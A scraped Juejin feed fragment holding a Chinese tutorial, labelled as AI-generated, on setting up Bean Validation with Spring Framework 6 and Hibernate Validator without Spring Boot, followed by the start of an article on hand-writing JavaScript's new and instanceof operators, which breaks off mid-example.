#cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>由 Gemini-3.0-pro-preview 生成</p>
</blockquote>
<p>Spring Core的Validation主要基于 <strong>JSR-380 (Bean Validation 2.0/3.0)</strong> 标准。Spring本身不直接实现校验逻辑，而是提供了一套机制来集成第三方的实现（通常是 <strong>Hibernate Validator</strong>）。</p>
<p>下面是一个完全不使用Spring Boot，仅使用Spring Framework 6 + Hibernate Validator的完整教程。</p>
<hr/>
<h3 data-id="heading-0">1. 理解核心概念</h3>
<p>在开始写代码前，你需要明白三个角色的关系：</p>
<ol>
<li><strong>JSR-380 API (Jakarta Validation)</strong>: 定义了校验的接口和注解（如 <code>@NotNull</code>, <code>@Size</code>）。这只是标准，没有代码逻辑。</li>
<li><strong>Hibernate Validator</strong>: 它是JSR-380的<strong>参考实现</strong>。真正干活（检查字段是否为空）的是它。</li>
<li><strong>Spring Core</strong>: 它是<strong>粘合剂</strong>。通过 <code>LocalValidatorFactoryBean</code> 将 Hibernate Validator 集成到 Spring 容器中，让你能在代码里轻松注入并使用。</li>
</ol>
<hr/>
<h3 data-id="heading-1">2. 环境搭建 (Maven依赖)</h3>
<p>由于没有Spring Boot Starter，我们需要手动引入所有必要的包。</p>
<p><strong>注意</strong>：这里我们使用 Spring 6 和 Jakarta EE (现代标准)。</p>
<p><code>pom.xml</code>:</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span>
    <span class="hljs-comment">&lt;!-- 1. Spring Context (Spring的核心) --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-context<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>6.1.3<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>

    <span class="hljs-comment">&lt;!-- 2. Jakarta Validation API (标准接口) --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>jakarta.validation<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>jakarta.validation-api<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.0.2<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>

    <span class="hljs-comment">&lt;!-- 3. Hibernate Validator (校验器的具体实现) --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.hibernate.validator<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>hibernate-validator<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>8.0.1.Final<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>

    <span class="hljs-comment">&lt;!-- 4. Expression Language (EL表达式支持) --&gt;</span>
    <span class="hljs-comment">&lt;!-- Hibernate Validator 依赖 EL 表达式来解析错误信息，Spring Boot内置了，但Core通过Main方法运行需要手动加 --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.glassfish<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>jakarta.el<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>4.0.2<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span>
</code></pre>
<hr/>
<h3 data-id="heading-2">3. 定义待校验的实体 (Java Bean)</h3>
<p>创建一个普通的User类，使用标准注解。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">package</span> com.example.demo.model;

<span class="hljs-keyword">import</span> jakarta.validation.constraints.Email;
<span class="hljs-keyword">import</span> jakarta.validation.constraints.Min;
<span class="hljs-keyword">import</span> jakarta.validation.constraints.NotBlank;
<span class="hljs-keyword">import</span> jakarta.validation.constraints.Size;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span> {

    <span class="hljs-meta">@NotBlank(message = "用户名不能为空")</span>
    <span class="hljs-keyword">private</span> String username;

    <span class="hljs-meta">@Size(min = 6, max = 20, message = "密码长度必须在6-20之间")</span>
    <span class="hljs-keyword">private</span> String password;

    <span class="hljs-meta">@Min(value = 18, message = "未成年人禁止注册")</span>
    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;

    <span class="hljs-meta">@Email(message = "邮箱格式不正确")</span>
    <span class="hljs-keyword">private</span> String email;

    <span class="hljs-comment">// Getters and Setters (必须有，否则Validation无法读取字段值)</span>
    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getUsername</span><span class="hljs-params">()</span> { <span class="hljs-keyword">return</span> username; }
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setUsername</span><span class="hljs-params">(String username)</span> { <span class="hljs-built_in">this</span>.username = username; }
    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getPassword</span><span class="hljs-params">()</span> { <span class="hljs-keyword">return</span> password; }
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setPassword</span><span class="hljs-params">(String password)</span> { <span class="hljs-built_in">this</span>.password = password; }
    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getAge</span><span class="hljs-params">()</span> { <span class="hljs-keyword">return</span> age; }
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setAge</span><span class="hljs-params">(<span class="hljs-type">int</span> age)</span> { <span class="hljs-built_in">this</span>.age = age; }
    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getEmail</span><span class="hljs-params">()</span> { <span class="hljs-keyword">return</span> email; }
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setEmail</span><span class="hljs-params">(String email)</span> { <span class="hljs-built_in">this</span>.email = email; }
}
</code></pre>
<hr/>
<h3 data-id="heading-3">4. Spring 配置类</h3>
<p>这是脱离Spring Boot最关键的一步。我们需要手动定义校验器的Bean。</p>
<p>核心类是：<code>LocalValidatorFactoryBean</code>。它既实现了Spring的校验接口，也实现了Jakarta的校验接口，会在启动时自动检测Classpath下的Hibernate Validator。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">package</span> com.example.demo.config;

<span class="hljs-keyword">import</span> org.springframework.context.annotation.Bean;
<span class="hljs-keyword">import</span> org.springframework.context.annotation.ComponentScan;
<span class="hljs-keyword">import</span> org.springframework.context.annotation.Configuration;
<span class="hljs-keyword">import</span> org.springframework.validation.beanvalidation.LocalValidatorFactoryBean;
<span class="hljs-keyword">import</span> org.springframework.validation.beanvalidation.MethodValidationPostProcessor;

<span class="hljs-meta">@Configuration</span>
<span class="hljs-meta">@ComponentScan(basePackages = "com.example.demo")</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AppConfig</span> {

    <span class="hljs-comment">/**
     * 配置全局校验器工厂
     * 作用：让Spring识别Hibernate Validator，并将其注册到容器中。
     */</span>
    <span class="hljs-meta">@Bean</span>
    <span class="hljs-keyword">public</span> LocalValidatorFactoryBean <span class="hljs-title function_">validator</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">LocalValidatorFactoryBean</span>();
    }

    <span class="hljs-comment">/**
     * 开启方法级别的校验支持 (可选，但在Service层校验很有用)
     * 作用：支持在方法参数上使用 <span class="hljs-doctag">@NotNull</span>, <span class="hljs-doctag">@Min</span> 等注解，
     * 以及在类上使用 <span class="hljs-doctag">@Validated</span> 注解。
     */</span>
    <span class="hljs-meta">@Bean</span>
    <span class="hljs-keyword">public</span> MethodValidationPostProcessor <span class="hljs-title function_">methodValidationPostProcessor</span><span class="hljs-params">()</span> {
        <span class="hljs-type">MethodValidationPostProcessor</span> <span class="hljs-variable">processor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MethodValidationPostProcessor</span>();
        processor.setValidator(validator());
        <span class="hljs-keyword">return</span> processor;
    }
}
</code></pre>
<hr/>
<h3 data-id="heading-4">5. 两种使用方式</h3>
<p>在后端开发中，通常有两种校验场景：</p>
<ol>
<li><strong>手动校验</strong>：在代码里显式调用校验逻辑（类似于Controller接收到JSON后）。</li>
<li><strong>方法级校验 (AOP)</strong>：调用Service方法时自动拦截校验参数。</li>
</ol>
<h4 data-id="heading-5">方式一：手动注入 Validator 进行校验</h4>
<p>创建一个Service，模拟处理业务逻辑。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">package</span> com.example.demo.service;

<span class="hljs-keyword">import</span> com.example.demo.model.User;
<span class="hljs-keyword">import</span> jakarta.validation.ConstraintViolation;
<span class="hljs-keyword">import</span> jakarta.validation.Validator; <span class="hljs-comment">// 注意是 jakarta 包</span>
<span class="hljs-keyword">import</span> org.springframework.beans.factory.annotation.Autowired;
<span class="hljs-keyword">import</span> org.springframework.stereotype.Service;

<span class="hljs-keyword">import</span> java.util.Set;

<span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserService</span> {

    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> Validator validator; <span class="hljs-comment">// 注入我们在AppConfig里配置的LocalValidatorFactoryBean</span>

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">registerUser</span><span class="hljs-params">(User user)</span> {
        <span class="hljs-comment">// 1. 执行校验</span>
        <span class="hljs-comment">// validate方法会返回一个Set，包含所有违规信息。如果Set为空，说明校验通过。</span>
        Set&lt;ConstraintViolation&lt;User&gt;&gt; violations = validator.validate(user);

        <span class="hljs-comment">// 2. 判断结果</span>
        <span class="hljs-keyword">if</span> (!violations.isEmpty()) {
            <span class="hljs-comment">// 有错误，打印出来或抛出异常</span>
            <span class="hljs-keyword">for</span> (ConstraintViolation&lt;User&gt; violation : violations) {
                System.out.println(<span class="hljs-string">"校验失败: "</span> + violation.getPropertyPath() + <span class="hljs-string">" "</span> + violation.getMessage());
            }
            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalArgumentException</span>(<span class="hljs-string">"参数校验失败"</span>);
        }

        System.out.println(<span class="hljs-string">"用户 "</span> + user.getUsername() + <span class="hljs-string">" 注册成功！"</span>);
    }
}
</code></pre>
<h4 data-id="heading-6">方式二：方法级别的自动校验 (@Validated)</h4>
<p>这种方式利用了Spring AOP，通过 <code>MethodValidationPostProcessor</code> 实现。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">package</span> com.example.demo.service;

<span class="hljs-keyword">import</span> jakarta.validation.constraints.NotNull;
<span class="hljs-keyword">import</span> org.springframework.stereotype.Service;
<span class="hljs-keyword">import</span> org.springframework.validation.annotation.Validated;

<span class="hljs-meta">@Service</span>
<span class="hljs-meta">@Validated</span> <span class="hljs-comment">// 1. 告诉Spring这个类需要被AOP代理进行校验</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OrderService</span> {

    <span class="hljs-comment">// 2. 直接在参数前加注解</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">createOrder</span><span class="hljs-params">(<span class="hljs-meta">@NotNull(message = "订单ID不能为空")</span> String orderId)</span> {
        System.out.println(<span class="hljs-string">"订单 "</span> + orderId + <span class="hljs-string">" 创建成功"</span>);
    }
}
</code></pre>
<hr/>
<h3 data-id="heading-7">6. 运行测试 (Main方法)</h3>
<p>最后，我们通过 <code>AnnotationConfigApplicationContext</code> 启动Spring容器来测试一下。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">package</span> com.example.demo;

<span class="hljs-keyword">import</span> com.example.demo.config.AppConfig;
<span class="hljs-keyword">import</span> com.example.demo.model.User;
<span class="hljs-keyword">import</span> com.example.demo.service.OrderService;
<span class="hljs-keyword">import</span> com.example.demo.service.UserService;
<span class="hljs-keyword">import</span> jakarta.validation.ConstraintViolationException;
<span class="hljs-keyword">import</span> org.springframework.context.ApplicationContext;
<span class="hljs-keyword">import</span> org.springframework.context.annotation.AnnotationConfigApplicationContext;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {
        <span class="hljs-comment">// 1. 启动 Spring 容器</span>
        <span class="hljs-type">ApplicationContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AnnotationConfigApplicationContext</span>(AppConfig.class);

        <span class="hljs-comment">// --- 测试 1: 手动校验 (UserService) ---</span>
        System.out.println(<span class="hljs-string">"--- 测试 1: 手动校验 ---"</span>);
        <span class="hljs-type">UserService</span> <span class="hljs-variable">userService</span> <span class="hljs-operator">=</span> context.getBean(UserService.class);
        
        <span class="hljs-type">User</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>();
        user.setUsername(<span class="hljs-string">""</span>); <span class="hljs-comment">// 违规：NotBlank</span>
        user.setAge(<span class="hljs-number">10</span>);      <span class="hljs-comment">// 违规：Min(18)</span>
        
        <span class="hljs-keyword">try</span> {
            userService.registerUser(user);
        } <span class="hljs-keyword">catch</span> (Exception e) {
            System.out.println(<span class="hljs-string">"捕获异常: "</span> + e.getMessage());
        }

        <span class="hljs-comment">// --- 测试 2: 方法级自动校验 (OrderService) ---</span>
        System.out.println(<span class="hljs-string">"\n--- 测试 2: 方法级自动校验 ---"</span>);
        <span class="hljs-type">OrderService</span> <span class="hljs-variable">orderService</span> <span class="hljs-operator">=</span> context.getBean(OrderService.class);
        
        <span class="hljs-keyword">try</span> {
            orderService.createOrder(<span class="hljs-literal">null</span>); <span class="hljs-comment">// 传入null，触发 @NotNull</span>
        } <span class="hljs-keyword">catch</span> (ConstraintViolationException e) {
            System.out.println(<span class="hljs-string">"捕获方法校验异常: "</span> + e.getMessage());
        }
    }
}
</code></pre>
<hr/>
<h3 data-id="heading-8">总结 (Junior Developer 知识点复盘)</h3>
<ol>
<li>
<p><strong>为什么没有Spring Boot也能跑？</strong>
Spring Boot只是帮你把 <code>LocalValidatorFactoryBean</code> 自动配置好了（放在了 <code>ValidationAutoConfiguration</code> 类里）。在这里，我们在 <code>AppConfig</code> 里自己 <code>new</code> 了一个，效果是一样的。</p>
</li>
<li>
<p><strong><code>jakarta.validation</code> vs <code>org.springframework.validation</code></strong></p>
<ul>
<li>我们在实体类上用的是 <code>jakarta.validation</code> (JSR标准)。</li>
<li>Spring也有自己的 <code>org.springframework.validation.Validator</code> 接口，但 <code>LocalValidatorFactoryBean</code> 很聪明，它同时实现了这两个接口。<strong>最佳实践是使用标准的 JSR 注解</strong>。</li>
</ul>
</li>
</ol></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[手写 new 操作符和 instanceof：深入理解 JavaScript 对象创建与原型链检测]]></title>    <link>https://juejin.cn/post/7581097111896080438</link>    <guid>https://juejin.cn/post/7581097111896080438</guid>    <pubDate>2025-12-08T09:26:45.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581097111896080438" data-draft-id="7581210455827087396" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="手写 new 操作符和 instanceof：深入理解 JavaScript 对象创建与原型链检测"/> <meta itemprop="keywords" content="前端,JavaScript,ECMAScript 6"/> <meta itemprop="datePublished" content="2025-12-08T09:26:45.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="1024肥宅"/> <meta itemprop="url" content="https://juejin.cn/user/588993964030574"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            手写 new 操作符和 instanceof：深入理解 JavaScript 对象创建与原型链检测
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/588993964030574/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    1024肥宅
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-08T09:26:45.000Z" title="Mon Dec 08 2025 09:26:45 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    16
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读8分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h4 data-id="heading-0">引言</h4>
<p>在JavaScript中，<code>new</code>操作符和<code>instanceof</code>操作符是面向对象编程的核心概念。理解它们的底层原理不仅能帮助我们更好地使用JavaScript，还能在面试中展现出更扎实的基础知识。</p>
<p>你是否曾好奇:</p>
<ul>
<li>当我们使用<code>new</code>创建对象时，背后到底发生了什么?</li>
<li><code>instanceof</code>是如何检测对象类型的?</li>
<li>原型链在对象创建和类型检测中扮演了什么角色?</li>
</ul>
<p>通过手写实现这两个操作符, 我们将深入理解JavaScript的对象创建机制和原型链检测原理。</p>
<h4 data-id="heading-1">一、new操作符的深入理解</h4>
<h5 data-id="heading-2">1.1 new操作符的作用</h5>
<p><code>new</code>操作符用于创建一个用户定义的对象类型的实例或具有构造函数的内置对象的实例。</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 基本用法</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">Person</span>(<span class="hljs-params">name, age</span>) {
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">age</span> = age;
}

<span class="hljs-title class_">Person</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">sayHello</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params"/>) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Hello, I'm <span class="hljs-subst">${<span class="hljs-variable language_">this</span>.name}</span>, <span class="hljs-subst">${<span class="hljs-variable language_">this</span>.age}</span> years old.`</span>);
};

<span class="hljs-keyword">const</span> person = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">"Alice"</span>, <span class="hljs-number">25</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(person.<span class="hljs-property">name</span>); <span class="hljs-comment">// Alice</span>
person.<span class="hljs-title function_">sayHello</span>(); <span class="hljs-comment">// Hello, I'm Alice, 25 years old.</span>
</code></pre>
<h5 data-id="heading-3">1.2 new操作符的执行过程</h5>
<p>当我们执行<code>new Constructor(...args)</code>时, JavaScript引擎会执行以下步骤:</p>
<ol>
<li><strong>创建一个新对象:</strong> 创建一个空的简单JavaScript对象(即<code>{}</code>)</li>
<li><strong>设置原型链:</strong> 将新对象的<code>[[Prototype]]</code>(即<code>__proto__</code>)指向构造函数的<code>prototype</code>属性</li>
<li><strong>绑定this值:</strong> 将构造函数中的<code>this</code>绑定到新创建的对象</li>
<li><strong>执行构造函数:</strong> 执行构造函数中的代码(为新对象添加属性)</li>
<li><strong>返回结果:</strong></li>
</ol>
<ul>
<li>如果构造函数返回一个对象, 则返回这个对象</li>
<li>否则返回新创建的对象</li>
</ul>
<h4 data-id="heading-4">二、手写new操作符</h4>
<h5 data-id="heading-5">2.1 基础实现</h5>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">/**
 * 手写 new 操作符
 * <span class="hljs-doctag">@param</span> {<span class="hljs-type">Function</span>} Constructor 构造函数
 * <span class="hljs-doctag">@param</span> {<span class="hljs-type">...any</span>} args 构造函数参数
 * <span class="hljs-doctag">@returns</span> {<span class="hljs-type">Object</span>} 新创建的对象
 */</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">myNew</span>(<span class="hljs-params">Constructor, ...args</span>) {
  <span class="hljs-comment">// 1. 创建一个新对象，继承构造函数的原型</span>
  <span class="hljs-keyword">const</span> obj = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">create</span>(<span class="hljs-title class_">Constructor</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>);

  <span class="hljs-comment">// 2. 执行构造函数，绑定 this 到新对象</span>
  <span class="hljs-keyword">const</span> result = <span class="hljs-title class_">Constructor</span>.<span class="hljs-title function_">apply</span>(obj, args);

  <span class="hljs-comment">// 3. 如果构造函数返回一个对象, 则返回该对象; 否则返回新对象</span>
  <span class="hljs-keyword">return</span> result <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">Object</span> ? result : obj;
}

<span class="hljs-comment">// 测试基础功能</span>
